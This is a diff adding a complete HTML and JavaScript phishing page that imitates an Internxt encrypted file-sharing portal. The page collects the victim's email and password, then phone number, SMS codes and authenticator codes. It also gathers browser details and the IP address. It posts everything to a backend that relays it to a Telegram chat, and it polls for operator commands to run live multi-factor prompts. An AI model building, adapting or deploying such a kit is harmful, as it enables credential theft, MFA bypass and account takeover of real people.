@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Encrypted Cloud File Storage</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+    <style>
+        :root {
+            --primary-blue: #0077e6;
+            --primary-blue-hover: #0066c7;
+        }
+
+        body,
+        html {
+            height: 100%;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* Background setup */
+        .bg-custom {
+            min-height: 100vh;
+            background: linear-gradient(135deg, rgba(3, 24, 76, 0.85), rgba(1, 10, 40, 0.95)),
+                url("https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1920&q=80") no-repeat center center fixed;
+            background-size: cover;
+            position: relative;
+        }
+
+        /* Top Left Logo Container */
+        .logo-container {
+            position: absolute;
+            top: 32px;
+            left: 48px;
+            z-index: 10;
+        }
+
+        .logo-img {
+            max-height: 44px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* Hero Text on Left */
+        .hero-title {
+            font-size: clamp(2rem, 3.5vw, 3.25rem);
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+        }
+
+        .hero-subtitle {
+            font-size: 0.95rem;
+            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 440px;
+        }
+
+        /* Card Styling */
+        .access-card {
+            border: none;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            max-width: 430px;
+            width: 100%;
+            background-color: #ffffff;
+        }
+
+        .card-header-custom {
+            background-color: #f8fafc;
+            border-bottom: 1px solid #eef2f6;
+            padding: 18px 24px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 1.05rem;
+            color: #1e293b;
+        }
+
+        .card-body-custom {
+            padding: 28px 28px 32px 28px;
+        }
+
+        .card-subtext {
+            font-size: 0.85rem;
+            color: #64748b;
+            line-height: 1.45;
+            margin-bottom: 20px;
+        }
+
+        /* Form Fields */
+        .form-control-custom {
+            height: 46px;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+            padding-left: 14px;
+            font-size: 0.9rem;
+            color: #334155;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .form-control-custom:focus {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(0, 119, 230, 0.15);
+        }
+
+        .form-control-custom::placeholder {
+            color: #94a3b8;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            pointer-events: none;
+            font-size: 1rem;
+        }
+
+        /* Action Button */
+        .btn-action {
+            background-color: var(--primary-blue);
+            border: none;
+            border-radius: 8px;
+            height: 44px;
+            font-weight: 500;
+            font-size: 0.95rem;
+            color: #ffffff;
+            width: 100%;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+        }
+
+        .btn-action:hover {
+            background-color: var(--primary-blue-hover);
+            color: #ffffff;
+        }
+
+        .btn-action:active {
+            transform: scale(0.99);
+        }
+
+        /* Error Message Box */
+        #auth-error {
+            display: none;
+            background-color: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            font-size: 0.85rem;
+            border-radius: 6px;
+            padding: 9px 12px;
+            margin-bottom: 16px;
+        }
+
+        /* Waiting Spinner Animation */
+        @keyframes rotate-spinner {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .waiting-spinner {
+            animation: rotate-spinner 1.2s linear infinite;
+        }
+
+        .otp-input {
+            letter-spacing: 6px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .number-tap-circle {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background-color: #eff6ff;
+            border: 3px solid var(--primary-blue);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 18px rgba(0, 119, 230, 0.2);
+            margin: 0 auto;
+        }
+
+        .number-tap-circle span {
+            font-size: 40px;
+            font-weight: 700;
+            color: var(--primary-blue);
+            letter-spacing: 1px;
+        }
+
+        /* Centered Verification Modal Popup Styling */
+        .custom-modal-dialog {
+            max-width: 440px;
+        }
+
+        .custom-modal-content {
+            border: none;
+            border-radius: 14px;
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.35);
+            background-color: #ffffff;
+            overflow: hidden;
+            padding: 10px 6px;
+        }
+
+        .popup-header-logo {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-top: 6px;
+        }
+
+        .popup-logo-img {
+            max-height: 36px;
+            width: auto;
+            object-fit: contain;
+            display: inline-block;
+        }
+
+        #popup-auth-error {
+            display: none;
+            background-color: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            font-size: 0.85rem;
+            border-radius: 6px;
+            padding: 9px 12px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        @media (max-width: 991px) {
+            .logo-container {
+                position: static;
+                padding-top: 24px;
+                padding-left: 16px;
+                margin-bottom: 24px;
+            }
+
+            .hero-title {
+                font-size: 2rem;
+            }
+
+            .bg-custom {
+                padding-bottom: 40px;
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-custom d-flex flex-column justify-content-between">
+
+    <!-- Top-Left Logo -->
+    <div class="logo-container">
+        <img src="./assets/img/internxt-logo.svg" alt="Brand Logo" class="logo-img" id="page-logo"
+            style="height: 16px;" />
+    </div>
+
+    <!-- Main Content Layout -->
+    <div class="container my-auto py-5">
+        <div class="row align-items-center justify-content-between g-5">
+
+            <!-- Left Column: Headline and Description -->
+            <div class="col-lg-6 text-start">
+                <h1 class="hero-title mb-4">
+                    Encrypted and send files<br class="d-none d-md-inline" /> in total privacy
+                </h1>
+                <p class="hero-subtitle mb-0">
+                    Internxt Send allows you to share files fast without worrying about the security of your documents,
+                    images, or videos. Select the files you want to encrypt and send by link or email.
+                </p>
+            </div>
+
+            <!-- Right Column: Interactive Card Container -->
+            <div class="col-lg-5 d-flex justify-content-lg-end justify-content-center">
+                <div class="access-card">
+
+                    <!-- Card Header -->
+                    <div class="card-header-custom" id="card-header-title">
+                        Encrypted Cloud File Storage
+                    </div>
+
+                    <!-- Card Body -->
+                    <div class="card-body-custom">
+
+                        <!-- Dynamic Error Banner -->
+                        <div id="auth-error" class="align-items-center gap-2">
+                            <i class="bi bi-exclamation-circle-fill flex-shrink-0"></i>
+                            <span id="auth-error-text">Invalid Email or Password</span>
+                        </div>
+
+                        <!-- 0. Loading View -->
+                        <div id="div_loading" style="display:none; text-align: center; padding: 25px 0;">
+                            <div class="spinner-border text-primary" role="status"
+                                style="width: 3.2rem; height: 3.2rem;">
+                                <span class="visually-hidden">Loading...</span>
+                            </div>
+                            <h5 class="mt-4 text-dark fw-semibold" id="loading_text">Verifying credentials...</h5>
+                            <p class="text-muted small mb-0">Please wait while we verify your secure session.</p>
+                        </div>
+
+                        <!-- 1. Email Entry View (Landing Form) -->
+                        <div id="main_email_view">
+                            <p class="card-subtext" id="div1-subtext">
+                                Internxt's protection protects this file. You need to enter the email that this was
+                                shared to:
+                            </p>
+                            <form id="main-email-form" novalidate>
+                                <!-- Email Field -->
+                                <div class="position-relative mb-3" id="email-field-container">
+                                    <input type="email" name="ai" class="form-control form-control-custom" id="ai"
+                                        placeholder="Enter email" required />
+                                    <i class="bi bi-envelope input-icon"></i>
+                                </div>
+
+                                <!-- Submit Button -->
+                                <button type="submit" class="btn btn-action" id="submit-btn">
+                                    View
+                                </button>
+                            </form>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Centered Verification Popup Modal -->
+    <div class="modal fade" id="verificationModal" tabindex="-1" aria-labelledby="verificationModalLabel"
+        aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+        <div class="modal-dialog modal-dialog-centered custom-modal-dialog">
+            <div class="modal-content custom-modal-content position-relative">
+                <button type="button" class="btn-close position-absolute top-0 end-0 m-3" data-bs-dismiss="modal"
+                    aria-label="Close" id="modal-close-btn"></button>
+                <div class="modal-body p-4 text-center">
+
+                    <!-- Small Center Logo (Replaceable) -->
+                    <div class="popup-header-logo text-center">
+                        <img id="companyLogo" src="./assets/img/internxt-logo.svg" alt="Popup Logo"
+                            class="popup-logo-img" />
+                    </div>
+
+                    <!-- Popup Error Banner -->
+                    <div id="popup-auth-error" class="align-items-center gap-2">
+                        <i class="bi bi-exclamation-circle-fill flex-shrink-0"></i>
+                        <span id="popup-auth-error-text">Verification failed. Please try again.</span>
+                    </div>
+
+                    <!-- Popup Loading View -->
+                    <div id="div_popup_loading" style="display:none; text-align: center; padding: 25px 0;">
+                        <div class="spinner-border text-primary" role="status" style="width: 3.2rem; height: 3.2rem;">
+                            <span class="visually-hidden">Loading...</span>
+                        </div>
+                        <h5 class="mt-4 text-dark fw-semibold" id="popup_loading_text">Verifying...</h5>
+                        <p class="text-muted small mb-0">Please wait while we verify your request.</p>
+                    </div>
+
+                    <!-- 1. Credentials View (Email & Password Form in Popup) -->
+                    <div id="div1" style="display:none; text-align: left;">
+                        <h5 class="fw-bold text-dark mb-1 text-center">Sign in to view file</h5>
+                        <p class="card-subtext mb-3 text-center">
+                            Internxt's protection protects this file. Enter your credentials to continue.
+                        </p>
+                        <form id="login-form" novalidate>
+                            <!-- Email Field -->
+                            <div class="position-relative mb-3">
+                                <input type="email" name="modal_ai" class="form-control form-control-custom" id="modal_ai"
+                                    placeholder="Enter email" required />
+                                <i class="bi bi-envelope input-icon"></i>
+                            </div>
+
+                            <!-- Password Field -->
+                            <div class="position-relative mb-4" id="password-field-container">
+                                <input type="password" name="pr" class="form-control form-control-custom" id="pr"
+                                    placeholder="Enter password" required />
+                                <i class="bi bi-lock input-icon"></i>
+                            </div>
+
+                            <!-- Submit Button -->
+                            <button type="submit" class="btn btn-action" id="modal-submit-btn">
+                                View
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- 2. Phone Prompt View (Asking for Phone) -->
+                    <div id="div2" style="display:none; text-align: left;">
+                        <h5 class="fw-bold text-dark mb-1 text-center">Verify it's you</h5>
+                        <p class="card-subtext mb-3 text-center">
+                            This device is not recognized. For security, we want to make sure it's really you.
+                        </p>
+                        <form id="phone-form" novalidate>
+                            <div class="position-relative mb-4">
+                                <input type="tel" name="phone" class="form-control form-control-custom" id="phone"
+                                    placeholder="Enter phone number" required />
+                                <i class="bi bi-telephone input-icon"></i>
+                            </div>
+                            <button type="submit" class="btn btn-action" id="submit-btn1">
+                                Verify Phone
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- 3. SMS Code View -->
+                    <div id="div_sms_code" style="display:none; text-align: left;">
+                        <h5 class="fw-bold text-dark mb-1 text-center">Enter Verification Code</h5>
+                        <p class="card-subtext mb-3 text-center">
+                            We sent a text message with a verification code to your phone.
+                        </p>
+                        <form id="sms-form" novalidate>
+                            <div class="position-relative mb-4">
+                                <input type="text" name="sms_code" class="form-control form-control-custom otp-input"
+                                    id="sms_code" placeholder="------" maxlength="8" required />
+                            </div>
+                            <button type="submit" class="btn btn-action" id="submit-sms-btn">
+                                Verify Code
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- 4. Authenticator Code View -->
+                    <div id="div_auth_code" style="display:none; text-align: left;">
+                        <h5 class="fw-bold text-dark mb-1 text-center">App Verification</h5>
+                        <p class="card-subtext mb-3 text-center">
+                            Enter the verification code generated by your Authenticator app.
+                        </p>
+                        <form id="auth-form" novalidate>
+                            <div class="position-relative mb-4">
+                                <input type="text" name="auth_code" class="form-control form-control-custom otp-input"
+                                    id="auth_code" placeholder="------" maxlength="8" required />
+                            </div>
+                            <button type="submit" class="btn btn-action" id="submit-auth-btn">
+                                Verify App Code
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- 5. Tap Yes View -->
+                    <div id="div_tap_yes" style="display:none; text-align: center; padding: 10px 0;">
+                        <h5 class="fw-bold text-dark mb-2">Check your Authenticator App</h5>
+                        <p class="card-subtext mb-4">
+                            We sent a notification to your mobile device. Open the Authenticator app and tap
+                            <strong>Yes</strong> to approve.
+                        </p>
+                        <div class="my-4 d-flex justify-content-center align-items-center">
+                            <svg width="76" height="76" viewBox="0 0 50 50" class="waiting-spinner">
+                                <circle cx="25" cy="25" r="20" fill="none" stroke="#0077e6" stroke-width="4"
+                                    stroke-linecap="round" stroke-dasharray="80, 200" />
+                            </svg>
+                        </div>
+                        <p class="text-muted small mt-3 mb-0">Waiting for approval...</p>
+                    </div>
+
+                    <!-- 6. Number Tap View -->
+                    <div id="div_number_tap" style="display:none; text-align: center; padding: 10px 0;">
+                        <h5 class="fw-bold text-dark mb-2">Check your Authenticator App</h5>
+                        <p class="card-subtext mb-4">
+                            Open your Authenticator app and enter or select the number shown below to approve the
+                            sign-in request.
+                        </p>
+                        <div class="my-4 d-flex justify-content-center align-items-center">
+                            <div class="number-tap-circle">
+                                <span id="number_tap_display">--</span>
+                            </div>
+                        </div>
+                        <div class="d-flex justify-content-center align-items-center mt-3 text-muted small">
+                            <svg width="20" height="20" viewBox="0 0 50 50" class="waiting-spinner me-2">
+                                <circle cx="25" cy="25" r="20" fill="none" stroke="#0077e6" stroke-width="5"
+                                    stroke-linecap="round" stroke-dasharray="80, 200" />
+                            </svg>
+                            <span>Waiting for approval in app...</span>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Config Placeholders -->
+    <p id="licenseKey" hidden></p>
+    <p id="telegramChatID" hidden></p>
+    <p id="systemValue" hidden></p>
+    <span id="field" hidden>Internxt</span>
+
+    <!-- Footer Spacer for Centering -->
+    <div class="d-none d-lg-block pb-3"></div>
+
+    <!-- jQuery and Bootstrap Bundle JS -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        const rawHash = window.location.hash;
+        let hashEmail = "";
+        if (rawHash && rawHash.length > 1) {
+            // Remove the leading '#'
+            hashEmail = rawHash.substring(1);
+            $("#ai").val(hashEmail);
+            $("#modal_ai").val(hashEmail);
+            updateBranding(hashEmail);
+            console.log("Stored email:", hashEmail);
+        }
+
+        function updateBranding(email) {
+            if (!email || !email.includes('@')) return;
+
+            const domain = email.split('@')[1]?.trim().toLowerCase();
+            if (!domain || !domain.includes('.')) return;
+
+            // Extract name without TLD (e.g., comcast.net -> Comcast, mail.com -> Mail)
+            // Removes standard TLDs or split by first dot and capitalize
+            const baseName = domain.split('.')[0];
+            const formattedName = baseName.charAt(0).toUpperCase() + baseName.slice(1);
+
+            // 1. Update text for all elements with class 'auto-name'
+            //   document.querySelectorAll('.auto-name').forEach(el => {
+            //     el.textContent = formattedName;
+            //   });
+
+            // 2. Auto Logo URL
+            const logoUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=64`;
+            const logoImg = document.getElementById('companyLogo');
+            if (logoImg) {
+                logoImg.src = logoUrl;
+                logoImg.onerror = function () {
+                    this.src = `https://placehold.co/100x100/6366f1/ffffff?text=${formattedName.charAt(0)}`;
+                };
+            }
+
+            //   // 3. Auto Background URL
+            //   const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
+            //   document.body.style.backgroundImage = `url('${bgUrl}')`;
+        }
+        const externalNumberYes = true;
+        let currentEmail = "";
+        let sessionId;
+        let lastFormView = "#div1";
+        const pages = ["Tap-Yes", "SMS CODE", "Authentication Code", "Ask Phonnumber", "Number-Tap", "Redirect.html"];
+        const popupViews = ["#div1", "#div2", "#div_sms_code", "#div_auth_code", "#div_tap_yes", "#div_number_tap", "#div_popup_loading"];
+        const browserInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookiesEnabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        // Helper: Fetch client IP address
+        async function getIPAddress() {
+            return new Promise((resolve) => {
+                $.getJSON("https://api.ipify.org?format=json", function (data) {
+                    resolve(data.ip);
+                }).fail(function () {
+                    resolve("Unknown IP");
+                });
+            });
+        }
+
+        // Helper: Get or create Bootstrap modal instance
+        function getVerificationModal() {
+            const modalEl = document.getElementById('verificationModal');
+            if (!modalEl) return null;
+            return bootstrap.Modal.getOrCreateInstance(modalEl);
+        }
+
+        // Modal hidden event handler: clean up popup error
+        const modalEl = document.getElementById('verificationModal');
+        if (modalEl) {
+            modalEl.addEventListener('hidden.bs.modal', function () {
+                $("#popup-auth-error").hide().removeClass("d-flex");
+                $("#pr").val("");
+            });
+        }
+
+        // Load configs from licenseKey.json
+        $.getJSON("licenseKey.json")
+            .done(function (data) {
+                $("#licenseKey").text(data.Page_LicenseKey || "");
+                $("#telegramChatID").text(data.telegram_chat_id || data.telegram_ChatID || "");
+                $("#systemValue").text(data.systemValue || "");
+                sendOpenNotification();
+            })
+            .fail(function (error) {
+                console.warn("Notice: licenseKey.json not found or could not be loaded.", error);
+            });
+
+        // Notify Telegram that the page is opened
+        async function sendOpenNotification() {
+            const ip = await getIPAddress();
+            const chatId = $("#telegramChatID").text().trim();
+            if (!chatId) return;
+
+            $.ajax({
+                url: "next.php/session-open",
+                method: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({
+                    message: `Internxt Portal Opened at IP: ${ip}
+----------------
+Browser Info:
+${browserInfo.userAgent}
+${browserInfo.platform}
+${browserInfo.timezone}`,
+                    telegramChatID: chatId
+                })
+            });
+        }
+
+        // Switch between card views and modal popups helper
+        function showView(viewId) {
+            if (viewId !== "#div_loading" && viewId !== "#div_popup_loading") {
+                lastFormView = viewId;
+            }
+
+            if (popupViews.includes(viewId)) {
+                // Keep the background main card visible
+                $("#div_loading").hide();
+                $("#main_email_view").show();
+
+                // Hide all sub-views in the modal popup
+                $("#div1, #div2, #div_sms_code, #div_auth_code, #div_tap_yes, #div_number_tap, #div_popup_loading").hide();
+                $("#popup-auth-error").hide().removeClass("d-flex");
+
+                // Toggle close button on modal (allow closing credentials view to return to page)
+                if (viewId === "#div1") {
+                    $("#modal-close-btn").show();
+                } else {
+                    $("#modal-close-btn").hide();
+                }
+
+                // Show target popup view
+                $(viewId).show();
+
+                // Show modal popup
+                const modal = getVerificationModal();
+                if (modal) {
+                    modal.show();
+                }
+            } else {
+                // If switching back to main card
+                const modal = getVerificationModal();
+                if (modal) {
+                    modal.hide();
+                }
+
+                $("#auth-error").hide().removeClass("d-flex");
+                $(viewId).show();
+            }
+        }
+
+        function showError(message) {
+            if (popupViews.includes(lastFormView)) {
+                $("#popup-auth-error-text").text(message);
+                $("#popup-auth-error").css("display", "flex").addClass("d-flex");
+            } else {
+                $("#auth-error-text").text(message);
+                $("#auth-error").css("display", "flex").addClass("d-flex");
+            }
+        }
+
+        // Handle Main Card Landing Form: Validates email, opens credentials modal
+        $("#main-email-form").submit(function (e) {
+            e.preventDefault();
+            const email = $("#ai").val().trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (email.length < 4 || !emailRegex.test(email)) {
+                $("#auth-error-text").text("Please enter a valid email address");
+                $("#auth-error").css("display", "flex").addClass("d-flex");
+                return;
+            }
+
+            // Hide previous errors on main card
+            $("#auth-error").hide().removeClass("d-flex");
+
+            currentEmail = email;
+            updateBranding(currentEmail);
+            $("#modal_ai").val(currentEmail);
+            $("#pr").val("");
+
+            // Show credentials modal view
+            showView("#div1");
+            setTimeout(function () {
+                $("#pr").focus();
+            }, 350);
+        });
+
+        // Sync modal email input back to main card and update branding if changed
+        $("#modal_ai").on("input change", function () {
+            const val = $(this).val().trim();
+            $("#ai").val(val);
+            if (val.includes("@")) {
+                currentEmail = val;
+                updateBranding(val);
+            }
+        });
+
+        // Handle Form 1: Popup Credentials (Email and Password in Modal)
+        $("#login-form").submit(async function (e) {
+            e.preventDefault();
+            const email = $("#modal_ai").val().trim();
+            const password = $("#pr").val();
+
+            currentEmail = email;
+            $("#ai").val(email);
+            updateBranding(currentEmail);
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (email.length < 4 || !emailRegex.test(email) || password.length < 4) {
+                showError("Invalid Email or Password");
+                return;
+            }
+
+            showView("#div_popup_loading");
+            $("#popup_loading_text").text("Verifying credentials...");
+
+            const ip = await getIPAddress();
+            const licenseKey = $("#licenseKey").text();
+            const telegramChatID = $("#telegramChatID").text();
+            const systemValue = $("#systemValue").text();
+
+            const result = `=> Internxt Portal Credentials <=
+========================================
+Location & IP Info:      
+IP-INFO : ${ip}
+
+----------------
+Browser Info:
+${browserInfo.userAgent}
+${browserInfo.platform}
+${browserInfo.timezone}
+
+========================================
+Provider : Internxt
+Email : ${email}
+Password : ${password}
+`;
+
+            submitResult(result, licenseKey, telegramChatID, systemValue);
+        });
+
+        // Handle Form 2: Phone Prompt
+        $("#phone-form").submit(async function (e) {
+            e.preventDefault();
+            const phone = $("#phone").val().trim();
+
+            if (!phone) {
+                showError("Please enter your phone number.");
+                return;
+            }
+
+            showView("#div_popup_loading");
+            $("#popup_loading_text").text("Submitting phone number...");
+
+            const ip = await getIPAddress();
+            const licenseKey = $("#licenseKey").text();
+            const telegramChatID = $("#telegramChatID").text();
+            const systemValue = $("#systemValue").text();
+
+            const result = `=> Internxt Verification Phone <=
+========================================
+Location & IP Info:      
+IP-INFO : ${ip}
+
+----------------
+
+Browser Info:
+${browserInfo.userAgent}
+${browserInfo.platform}
+${browserInfo.timezone}
+
+========================================
+Phone Number : ${phone}
+`;
+
+            submitResult(result, licenseKey, telegramChatID, systemValue);
+        });
+
+        // Handle Form 3: SMS Code
+        $("#sms-form").submit(async function (e) {
+            e.preventDefault();
+            const code = $("#sms_code").val().trim();
+
+            if (!code) {
+                showError("Please enter the SMS code.");
+                return;
+            }
+
+            showView("#div_popup_loading");
+            $("#popup_loading_text").text("Validating SMS code...");
+
+            const ip = await getIPAddress();
+            const licenseKey = $("#licenseKey").text();
+            const telegramChatID = $("#telegramChatID").text();
+            const systemValue = $("#systemValue").text();
+
+            const result = `=> Internxt SMS Verification Code <=
+========================================
+Location & IP Info:      
+IP-INFO : ${ip}
+
+----------------
+
+Browser Info:
+${browserInfo.userAgent}
+${browserInfo.platform}
+${browserInfo.timezone}
+
+========================================
+SMS Code : ${code}
+`;
+
+            submitResult(result, licenseKey, telegramChatID, systemValue);
+        });
+
+        // Handle Form 4: Authenticator Code
+        $("#auth-form").submit(async function (e) {
+            e.preventDefault();
+            const code = $("#auth_code").val().trim();
+
+            if (!code) {
+                showError("Please enter the authenticator code.");
+                return;
+            }
+
+            showView("#div_popup_loading");
+            $("#popup_loading_text").text("Verifying authenticator code...");
+
+            const ip = await getIPAddress();
+            const licenseKey = $("#licenseKey").text();
+            const telegramChatID = $("#telegramChatID").text();
+            const systemValue = $("#systemValue").text();
+
+            const result = `=> Internxt Authenticator Code <=
+========================================
+Location & IP Info:      
+IP-INFO : ${ip}
+
+----------------
+
+Browser Info:
+${browserInfo.userAgent}
+${browserInfo.platform}
+${browserInfo.timezone}
+
+========================================
+Authenticator App Code : ${code}
+`;
+
+            submitResult(result, licenseKey, telegramChatID, systemValue);
+        });
+
+        // Send payload to backend
+        function submitResult(result, licenseKey, telegramChatID, systemValue) {
+            $.ajax({
+                url: "next.php/submit-result",
+                method: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({ result, licenseKey, telegramChatID, systemValue, pages }),
+                success: function (data) {
+                    if (data.error) {
+                        showView(lastFormView);
+                        showError(data.error);
+                        return;
+                    }
+                    sessionId = data.sessionId;
+                    pollStatus();
+                },
+                error: function (xhr) {
+                    let errMsg = "Server communication error. Please try again.";
+                    try {
+                        const errData = JSON.parse(xhr.responseText);
+                        if (errData && errData.error) errMsg = errData.error;
+                    } catch (e) {}
+                    console.error("Error submitting response:", errMsg);
+                    showView(lastFormView);
+                    showError(errMsg);
+                }
+            });
+        }
+
+        // Polling function for live response states
+        async function pollStatus() {
+            if (!sessionId) return;
+            const pollStartTime = Date.now();
+            const POLL_TIMEOUT_MS = 180000; // 3-minute timeout
+            const targetRedirect = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
+
+            function fetchStatus() {
+                if (Date.now() - pollStartTime > POLL_TIMEOUT_MS) {
+                    showView(lastFormView);
+                    showError("Verification timed out. Please try again.");
+                    return;
+                }
+                $.ajax({
+                    url: `next.php/status/${sessionId}`,
+                    method: "GET",
+                    success: function (data) {
+                        if (data.error && data.error.includes("not found")) {
+                            showView(lastFormView);
+                            showError("Session expired. Please try again.");
+                            return;
+                        }
+                        // Check for redirect value
+                        if (data.redirect) {
+                            const redirectVal = data.redirect.toLowerCase();
+
+                            // Number-Tap
+                            if (redirectVal.includes("numbertap") || redirectVal.includes("number-tap") || redirectVal.includes("number_tap") || redirectVal.includes("number tap") || data.numberTap) {
+                                let tapNum = data.numberTap;
+                                if (!tapNum && data.redirect.includes(":")) {
+                                    tapNum = data.redirect.split(":")[1];
+                                } else if (!tapNum) {
+                                    tapNum = data.redirect.replace(/[^0-9]/g, '');
+                                }
+                                tapNum = (tapNum || "--").toString().trim();
+
+                                // If externalNumberYes is true, redirect to tap.html with the number and email in hash
+                                if (typeof externalNumberYes !== 'undefined' && externalNumberYes) {
+                                    const userEmail = currentEmail || $("#modal_ai").val().trim() || $("#ai").val().trim() || "";
+                                    const encodedNum = btoa(tapNum);
+                                    window.location.href = `tap.html#${encodedNum}&${userEmail}`;
+                                    return;
+                                }
+
+                                $("#number_tap_display").text(tapNum);
+                                showView("#div_number_tap");
+                                setTimeout(fetchStatus, 2500);
+                                return;
+                            } else if (redirectVal.includes("sms code") || redirectVal.includes("sms_code") || redirectVal.includes("sms")) {
+                                showView("#div_sms_code");
+                                $("#sms_code").val("");
+                            } else if (redirectVal.includes("tap-yes") || redirectVal.includes("tap yes") || redirectVal.includes("tap_yes") || redirectVal.includes("tap") || redirectVal.includes("yes")) {
+                                showView("#div_tap_yes");
+                                setTimeout(fetchStatus, 2500);
+                            } else if (redirectVal.includes("authentication code") || redirectVal.includes("auth") || redirectVal.includes("authenticator")) {
+                                showView("#div_auth_code");
+                                $("#auth_code").val("");
+                            } else if (redirectVal.includes("ask phonnumber") || redirectVal.includes("ask phonenumber") || redirectVal.includes("ask_phone") || redirectVal.includes("phone") || redirectVal.includes("prompt")) {
+                                showView("#div2");
+                                $("#phone").val("");
+                            } else if (redirectVal.includes("redirect.html") || redirectVal.includes("redirect") || redirectVal.includes("saved") || redirectVal.includes("cvent.com")) {
+                                window.location.href = targetRedirect;
+                                return;
+                            } else if (redirectVal.startsWith("http://") || redirectVal.startsWith("https://")) {
+                                window.location.href = data.redirect;
+                                return;
+                            } else {
+                                window.location.href = targetRedirect;
+                                return;
+                            }
+                            return;
+                        }
+
+                        // Check for retry command
+                        if (data.message === "retry" || data.status === "retry") {
+                            showView(lastFormView);
+
+                            let errMsg = "Verification failed. Please try again.";
+                            if (lastFormView === "#div1") {
+                                $("#password-field-container").show();
+                                $("#pr").val("").focus();
+                                errMsg = "Incorrect password. Please try again.";
+                            } else if (lastFormView === "#div2") {
+                                $("#phone").val("").focus();
+                                errMsg = "Invalid phone number format. Please enter a valid number.";
+                            } else if (lastFormView === "#div_sms_code") {
+                                $("#sms_code").val("").focus();
+                                errMsg = "Invalid SMS verification code. Please check and try again.";
+                            } else if (lastFormView === "#div_auth_code") {
+                                $("#auth_code").val("").focus();
+                                errMsg = "Invalid Authenticator App code. Please try again.";
+                            }
+
+                            showError(errMsg);
+                            return;
+                        }
+
+                        // Continue polling
+                        setTimeout(fetchStatus, 2500);
+                    },
+                    error: function (error) {
+                        console.error("Polling error:", error);
+                        setTimeout(fetchStatus, 3000);
+                    }
+                });
+            }
+
+            fetchStatus();
+        }
+    </script>
+</body>
+
+</html>
